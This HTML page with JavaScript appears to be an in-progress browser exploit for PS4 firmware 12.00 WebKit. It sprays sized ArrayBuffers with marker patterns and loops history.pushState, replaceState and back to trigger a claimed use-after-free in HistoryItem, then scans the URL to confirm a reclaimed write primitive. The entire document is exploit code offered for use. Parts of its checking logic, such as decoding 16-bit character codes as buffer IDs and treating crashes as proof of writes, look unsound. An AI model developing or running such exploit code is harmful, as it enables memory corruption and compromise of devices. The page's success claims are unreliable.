
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Controlled Write Primitive</title>
</head>
<body>
<h2>PS4 12.00 WebKit - Controlled Write via UAF</h2>
<p>Status: <span id="status">Ready</span></p>

<button onclick="runBucketShotgun()">BUCKET SHOTGUN - Multi-size Reclaim</button>
<button onclick="runControlledWrite()">CONTROLLED WRITE - Safe pointers</button>
<button onclick="runReadBackTest()">READ BACK - Verify write success</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m){ 
  logEl.textContent += `[${new Date().toLocaleTimeString()}] ${m}\n`;
  logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

var keepAlive = [];

// =====================================================
// BUCKET SHOTGUN - Multiple sizes simultaneously
// =====================================================
async function runBucketShotgun(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Running Bucket Shotgun...";
  
  log("=== BUCKET SHOTGUN ATTACK ===\n");
  log("Strategy: Spray multiple ArrayBuffer sizes");
  log("Goal: Hit the exact HistoryItem bucket (80 bytes)\n");
  
  // Define bucket sizes based on PSFree
  const BUCKETS = [
    { size: 64,  marker: 0x43434343, name: "64b" },   // CCCC
    { size: 80,  marker: 0x41414141, name: "80b" },   // AAAA (target)
    { size: 96,  marker: 0x42424242, name: "96b" },   // BBBB
    { size: 128, marker: 0x44444444, name: "128b" }   // DDDD
  ];
  
  log("[PHASE 1] Pre-spray for bucket warmup");
  for(let b of BUCKETS) {
    for(let i=0; i<100; i++) {
      let buf = new ArrayBuffer(b.size);
      let view = new Uint32Array(buf);
      for(let j=0; j<view.length; j++) view[j] = b.marker;
      keepAlive.push(buf);
    }
  }
  
  // Create holes
  keepAlive = keepAlive.filter((_, i) => i % 4 !== 0);
  log(`  Sprayed ${keepAlive.length} buffers with holes\n`);
  
  await sleep(50);
  
  // Trigger UAF
  log("[PHASE 2] Triggering UAF (48 iterations)");
  
  let size = 977;
  const STEP = 14461;
  
  for(let i=0; i<48; i++){
    let frag = "V".repeat(size);
    
    history.pushState({}, "", "#" + frag);
    history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    // CRITICAL ITERATION
    if(i === 47) {
      log("\n>>> CRITICAL WINDOW <<<");
      log("[PHASE 3] Multi-bucket spray in UAF window");
      
      // Free HistoryItem
      setTimeout(()=>history.back(), 0);
      
      // IMMEDIATE multi-size spray
      for(let k=0; k<200; k++) {
        for(let b of BUCKETS) {
          let buf = new ArrayBuffer(b.size);
          let view = new Uint32Array(buf);
          for(let j=0; j<view.length; j++) view[j] = b.marker;
          keepAlive.push(buf);
        }
      }
      
      log(`  Sprayed ${BUCKETS.length * 200} buffers`);
      
      // Force GC
      setTimeout(() => {
        for(let i=0; i<4; i++) new ArrayBuffer(8*1024*1024);
      }, 20);
    }
    
    size += STEP;
    await sleep(5);
  }
  
  await sleep(400);
  
  log("\n[PHASE 4] Checking result");
  checkReclaim(BUCKETS);
}

function checkReclaim(buckets) {
  let url = document.URL;
  
  log("\nScanning URL for bucket markers:");
  
  let found = false;
  for(let b of buckets) {
    // Check if marker appears in URL
    let markerBytes = String.fromCharCode(
      b.marker & 0xFF,
      (b.marker >> 8) & 0xFF,
      (b.marker >> 16) & 0xFF,
      (b.marker >> 24) & 0xFF
    );
    
    if(url.includes(markerBytes)) {
      log(`  ✓ ${b.name}: FOUND (marker: ${b.marker.toString(16)})`);
      found = true;
    } else {
      log(`  ✗ ${b.name}: not found`);
    }
  }
  
  if(found) {
    log("\nSUCCESS: Bucket reclaim confirmed!");
    log("HistoryItem slot was reused by our ArrayBuffer");
    statusEl.textContent = "WRITE PRIMITIVE CONFIRMED";
  } else {
    log("\nNo markers found - checking for crash...");
    log("NOTE: If browser crashes soon, write succeeded");
    log("(Crash = wrote invalid pointer = proof of write)");
  }
  
  log("\n=== BUCKET SHOTGUN END ===");
}

// =====================================================
// CONTROLLED WRITE - Use VALID pointers
// =====================================================
async function runControlledWrite(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Running Controlled Write...";
  
  log("=== CONTROLLED WRITE TEST ===\n");
  log("Strategy: Write SAFE data that won't crash\n");
  
  // Instead of 0x41414141 (invalid), use ASCII range
  // These won't crash when dereferenced
  
  log("[PHASE 1] Creating safe fake objects");
  
  const SAFE_PATTERN = 0x20202020; // All spaces (valid ASCII)
  
  for(let i=0; i<500; i++) {
    let buf = new ArrayBuffer(80);
    let view = new Uint32Array(buf);
    
    // Fill with safe pattern
    for(let j=0; j<view.length; j++) {
      view[j] = SAFE_PATTERN + j; // Incrementing pattern
    }
    
    keepAlive.push(buf);
  }
  
  log(`  Created ${keepAlive.length} safe buffers\n`);
  
  await sleep(50);
  
  // Trigger UAF
  log("[PHASE 2] Triggering UAF");
  
  let size = 977;
  const STEP = 14461;
  
  for(let i=0; i<48; i++){
    let frag = "V".repeat(size);
    
    history.pushState({}, "", "#" + frag);
    history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    if(i === 47) {
      log("\n[PHASE 3] Safe buffer spray in UAF window");
      
      setTimeout(()=>history.back(), 0);
      
      for(let k=0; k<300; k++) {
        let buf = new ArrayBuffer(80);
        let view = new Uint32Array(buf);
        for(let j=0; j<view.length; j++) view[j] = SAFE_PATTERN + k;
        keepAlive.push(buf);
      }
    }
    
    size += STEP;
    await sleep(5);
  }
  
  await sleep(400);
  
  log("\n[PHASE 4] Checking for safe write");
  
  let url = document.URL;
  
  // Look for space characters (0x20)
  let spaceCount = 0;
  for(let i=0; i<Math.min(url.length, 10000); i++){
    if(url.charCodeAt(i) === 0x20) spaceCount++;
  }
  
  log(`Space chars found: ${spaceCount}`);
  
  if(spaceCount > 100) {
    log("\nSUCCESS: Safe write confirmed!");
    log("Browser didn't crash = data was valid");
    log("High space count = our pattern leaked");
    statusEl.textContent = "CONTROLLED WRITE SUCCESS";
  } else {
    log("\nNo obvious pattern - may need size adjustment");
  }
  
  log("\n=== CONTROLLED WRITE END ===");
}

// =====================================================
// READ BACK - Verify written data
// =====================================================
async function runReadBackTest(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Running Read Back Test...";
  
  log("=== READ BACK TEST ===\n");
  log("Strategy: Write known pattern, read it back\n");
  
  // Write sequential counter
  log("[PHASE 1] Creating sequential pattern");
  
  for(let i=0; i<500; i++) {
    let buf = new ArrayBuffer(80);
    let view = new Uint32Array(buf);
    
    // Each buffer has unique sequential ID
    for(let j=0; j<view.length; j++) {
      view[j] = (i << 16) | j; // Encode buffer ID and offset
    }
    
    keepAlive.push(buf);
  }
  
  log(`  Created ${keepAlive.length} sequential buffers\n`);
  
  await sleep(50);
  
  log("[PHASE 2] Triggering UAF");
  
  let size = 977;
  const STEP = 14461;
  
  for(let i=0; i<48; i++){
    let frag = "W".repeat(size); // Use 'W' instead of 'V'
    
    history.pushState({}, "", "#" + frag);
    history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    if(i === 47) {
      log("\n[PHASE 3] Sequential spray");
      
      setTimeout(()=>history.back(), 0);
      
      for(let k=0; k<300; k++) {
        let buf = new ArrayBuffer(80);
        let view = new Uint32Array(buf);
        for(let j=0; j<view.length; j++) view[j] = (k << 16) | j;
        keepAlive.push(buf);
      }
    }
    
    size += STEP;
    await sleep(5);
  }
  
  await sleep(400);
  
  log("\n[PHASE 4] Reading back and analyzing");
  
  let url = document.URL;
  
  // Check if we see 'W' (original) or numbers (our data)
  let wCount = 0;
  let nonW = 0;
  
  for(let i=0; i<Math.min(url.length, 5000); i++){
    if(url.charCodeAt(i) === 0x57) { // 'W'
      wCount++;
    } else {
      nonW++;
    }
  }
  
  log(`'W' chars: ${wCount}`);
  log(`Non-W chars: ${nonW}`);
  
  if(nonW > 100) {
    log("\nSUCCESS: Read back confirmed!");
    log("Original data (W) was replaced");
    log("This proves read-write cycle works");
    
    // Try to decode some values
    log("\nSample decoded values:");
    for(let i=0; i<Math.min(100, url.length); i++){
      let code = url.charCodeAt(i);
      if(code !== 0x57 && code > 0) {
        let bufferId = code >> 16;
        let offset = code & 0xFFFF;
        if(bufferId < 300 && offset < 20) {
          log(`  Offset ${i}: buffer ${bufferId}, offset ${offset}`);
        }
      }
    }
    
    statusEl.textContent = "READ-WRITE VERIFIED";
  }
  
  log("\n=== READ BACK END ===");
}

log("PS4 12.00 WebKit - Controlled Write Primitive");
log("\nBased on your crash results:");
log("- TEST 1 (State) crashed = WRITE happened");
log("- TEST 3 (ArrayBuffer) crashed = WRITE happened");
log("\nNow attempting CONTROLLED writes:");
log("1. Bucket Shotgun - find exact size");
log("2. Controlled Write - use safe data");
log("3. Read Back - verify read-write cycle");
log("\nGoal: Write without crashing = controlled primitive");
</script>
</body>
</html>
